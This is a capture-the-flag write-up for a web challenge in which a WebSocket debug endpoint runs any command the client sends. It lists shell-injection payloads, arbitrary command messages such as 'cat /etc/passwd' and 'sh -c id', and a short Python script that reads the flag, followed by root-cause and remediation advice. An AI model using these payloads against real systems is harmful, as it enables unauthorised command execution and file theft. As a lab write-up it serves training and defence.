# SocketStorm — CTF Writeup

**Category:** Web Security / Machine Control
**Difficulty:** Medium
**Points:** 200
**Target:** `ctf-akshay-socketstorm-c1a20409.challenges.pentestgarage.com:80`

## Summary

A "Debug Socket" web app exposes a WebSocket endpoint at `/api/ws` that accepts
JSON messages of the form `{"command": ..., "args": [...]}` and runs them
server-side. The client-side UI only offers `ping` and `uptime` buttons, but
the server places **no restriction on the `command` field at all**, allowing
arbitrary command execution with attacker-controlled arguments — no shell
injection or escaping tricks required.

**Flag:** `ctf{ooshaexohch7ohZ7Aez7yiejajiephah}`

## Recon

Fetched the landing page and static assets:

```bash
curl -i http://ctf-akshay-socketstorm-c1a20409.challenges.pentestgarage.com/
curl -s http://ctf-akshay-socketstorm-c1a20409.challenges.pentestgarage.com/script.js
```

`script.js` revealed the WebSocket endpoint and the two exposed actions:

```js
debugWebSocketConnection = new WebSocket("ws://" + location.host + "/api/ws")
debugWebSocketConnection.onmessage = (event) => {
    document.getElementById("output-text-area").innerText = JSON.parse(event.data).output
}

function pingHandler() {
    let msg = { command: "ping", args: ["1.1.1.1", "-c", "1"] }
    debugWebSocketConnection.send(JSON.stringify(msg))
}

function uptimeHandler() {
    let msg = { command: "uptime", args: [] }
    debugWebSocketConnection.send(JSON.stringify(msg))
}
```

This shows the exact message schema the server expects: a JSON object with a
`command` string and an `args` array, echoed back as `{"output": "..."}`.

## Testing shell injection (failed)

Initial hypothesis: the server builds a shell string like `ping -c 1 <arg>`
and executes it with `shell=True`. Tested classic shell metacharacter
injection in the `args` values:

```python
["1.1.1.1; id"]
["1.1.1.1 && id"]
["1.1.1.1 | id"]
["`id`"]
["$(id)"]
```

All of these returned `{"output":""}` with no error — indicating the payloads
were being passed as **literal, malformed arguments to `ping`** rather than
being interpreted by a shell. This pointed to `subprocess.run([command] +
args)` with `shell=True` **not** in use.

## Testing command allowlisting (success)

Since `args` weren't shell-interpreted, the next question was whether
`command` itself was restricted to `ping`/`uptime`. Sent messages with
arbitrary binary names as `command`:

```python
{"command": "id",     "args": []}
{"command": "whoami",  "args": []}
{"command": "sh",      "args": ["-c", "id"]}
{"command": "ls",      "args": ["-la", "/"]}
{"command": "cat",     "args": ["/etc/passwd"]}
```

All executed successfully and returned real output, confirming:

- The server does **not** validate `command` against an allowlist.
- Any binary on the system's `PATH` can be executed with fully
  attacker-controlled arguments.
- `ls -la /` revealed a world-readable `flag.txt` in the container's root
  directory.

## Exploitation

```python
import websocket, json

ws = websocket.create_connection(
    "ws://ctf-akshay-socketstorm-c1a20409.challenges.pentestgarage.com/api/ws"
)
msg = {"command": "cat", "args": ["/flag.txt"]}
ws.send(json.dumps(msg))
print(ws.recv())
```

**Output:**

```json
{"output":"ctf{ooshaexohch7ohZ7Aez7yiejajiephah}\n"}
```

## Root Cause

The client-side JavaScript only exposes `ping` and `uptime` as UI actions,
but this is **not a security boundary** — it's cosmetic. The real
enforcement point is the server's WebSocket message handler, which trusted
the `command` field completely and passed it straight into a
`subprocess.run([command] + args)`-style call with no allowlist or input
validation.

This is a textbook example of confusing client-side UX restrictions with
server-side authorization/validation.

## Remediation

- **Allowlist commands server-side.** Map a small, fixed set of command
  names to fixed binary paths, e.g.:
  ```python
  ALLOWED_COMMANDS = {
      "ping": "/bin/ping",
      "uptime": "/usr/bin/uptime",
  }
  ```
  Reject any `command` not in this map.
- **Validate `args` per-command.** For `ping`, validate the target against a
  strict IP/hostname regex and enforce fixed flags (`-c`, `1`) rather than
  accepting arbitrary values from the client.
- **Never pass client-controlled strings directly into `subprocess`
  argument lists**, even without `shell=True` — arbitrary binary execution
  is just as dangerous as shell injection.
- **Principle of least privilege:** run the debug socket service under a
  minimally privileged account with no access to sensitive files, in case
  a similar bug resurfaces.

## Tools Used

- `curl` — static recon
- Python `websocket-client` library — scripted WebSocket message testing
- Manual JSON payload crafting
